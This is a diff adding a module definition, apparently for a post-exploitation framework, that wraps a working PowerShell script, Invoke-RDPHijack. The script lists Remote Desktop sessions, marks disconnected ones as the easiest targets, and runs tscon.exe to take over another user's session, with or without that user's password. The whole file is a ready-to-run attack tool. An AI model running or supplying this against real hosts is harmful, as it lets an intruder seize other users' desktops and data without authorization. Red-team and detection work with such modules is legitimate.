@@ -1,0 +1,155 @@
+name: Invoke-RDPHijack
+authors:
+  - name: Anthony Rose
+    handle: '@Cx01N'
+    link: https://twitter.com/Cx01N_
+description: |
+  Hijacks disconnected or active Remote Desktop Protocol (RDP) sessions using
+  the built-in Windows utility tscon.exe. This technique can transfer the
+  current desktop context into another user's session and may allow session
+  takeover without user credentials in certain conditions. SYSTEM-level
+  privileges are required on the target host for reliable session hijacking.
+  Disconnected sessions are typically the easiest to hijack because they often
+  do not require a password prompt.
+software: ''
+tactics: [TA0008]
+techniques: [T1563.002]
+background: false
+output_extension: ''
+needs_admin: true
+opsec_safe: false
+language: powershell
+min_language_version: '2'
+comments:
+  - https://medium.com/@intruder_/remote-desktop-session-hijacking-55bc7563a4c3
+options:
+  - name: Agent
+    description: Agent to run module on.
+    required: true
+    value: ''
+  - name: SessionID
+    description: Target RDP session ID to hijack. Use 'query user' to enumerate.
+    required: false
+    value: ''
+  - name: TargetSession
+    description: Destination session (defaults to current console).
+    required: false
+    value: 'console'
+  - name: Password
+    description: Password for the target session user (optional, for active sessions).
+    required: false
+    value: ''
+  - name: ListSessions
+    description: List active RDP sessions instead of hijacking.
+    required: false
+    value: 'False'
+    strict: true
+    suggested_values:
+      - 'True'
+      - 'False'
+script: |
+  function Invoke-RDPHijack {
+      [CmdletBinding()]
+      Param(
+          [String]$SessionID,
+          [String]$TargetSession = 'console',
+          [String]$Password,
+          [Switch]$ListSessions
+      )
+
+      $listOnly = $ListSessions.IsPresent
+
+      if ($listOnly) {
+          Write-Output '[*] Enumerating RDP sessions with query user...'
+          try {
+              $sessionOutput = (query user 2>&1) | Out-String
+              if ($sessionOutput -and $sessionOutput.Trim().Length -gt 0) {
+                  Write-Output $sessionOutput.Trim()
+              } else {
+                  Write-Output '[!] No RDP sessions found or query user returned no output.'
+              }
+          }
+          catch {
+              Write-Output "[!] Failed to enumerate sessions: $($_.Exception.Message)"
+          }
+          return
+      }
+
+      if (-not $SessionID) {
+          Write-Output '[*] No SessionID supplied. Enumerating available sessions...'
+          Write-Output '[*] Disconnected sessions (Disc) are usually easiest to hijack.'
+          try {
+              $sessionOutput = (query user 2>&1) | Out-String
+              if ($sessionOutput -and $sessionOutput.Trim().Length -gt 0) {
+                  $lines = $sessionOutput.Trim() -split "`n"
+                  foreach ($line in $lines) {
+                      if ($line -match '\sDisc\s') {
+                          Write-Output "[Disc] $line"
+                      }
+                      else {
+                          Write-Output "       $line"
+                      }
+                  }
+              } else {
+                  Write-Output '[!] No RDP sessions found or query user returned no output.'
+              }
+
+              Write-Output '[*] Re-run with -SessionID <id> to hijack a target session.'
+          }
+          catch {
+              Write-Output "[!] Failed to enumerate sessions: $($_.Exception.Message)"
+              Write-Output '[!] Ensure you are running as SYSTEM/Administrator and have access to tscon.exe.'
+          }
+          return
+      }
+
+      if (-not (Get-Command tscon.exe -ErrorAction SilentlyContinue)) {
+          Write-Output '[!] tscon.exe was not found on this system.'
+          return
+      }
+
+      Write-Output "[*] Attempting to hijack SessionID '$SessionID' to destination '$TargetSession'."
+      if ($Password) {
+          Write-Output '[*] Using supplied password for active session takeover attempt.'
+      }
+      else {
+          Write-Output '[*] No password supplied. This is commonly successful for disconnected sessions when running as SYSTEM.'
+      }
+
+      try {
+          $cmdArgs = @($SessionID, "/dest:$TargetSession")
+          if ($Password) {
+              $cmdArgs += "/password:$Password"
+          }
+
+          $tsconOutput = & tscon.exe @cmdArgs 2>&1
+          if ($LASTEXITCODE -ne 0) {
+              $errorText = ($tsconOutput | Out-String).Trim()
+              if (-not $errorText) {
+                  $errorText = 'Unknown tscon.exe error.'
+              }
+
+              if ($errorText -match 'denied|privilege|access') {
+                  Write-Output "[!] Access denied or insufficient privileges: $errorText"
+                  Write-Output '[!] Session hijacking requires SYSTEM-level context.'
+              }
+              elseif ($errorText -match 'not exist|invalid|No session') {
+                  Write-Output "[!] Session '$SessionID' does not exist or is invalid: $errorText"
+              }
+              else {
+                  Write-Output "[!] tscon.exe failed: $errorText"
+              }
+              return
+          }
+
+          if ($tsconOutput) {
+              Write-Output $tsconOutput
+          }
+          Write-Output "[+] Successfully issued tscon hijack for SessionID '$SessionID'."
+      }
+      catch {
+          Write-Output "[!] Session hijack failed: $($_.Exception.Message)"
+          Write-Output '[!] Verify SessionID, privileges, and whether the target session requires a valid password.'
+      }
+  }
+script_end: Invoke-RDPHijack {{ PARAMS }}
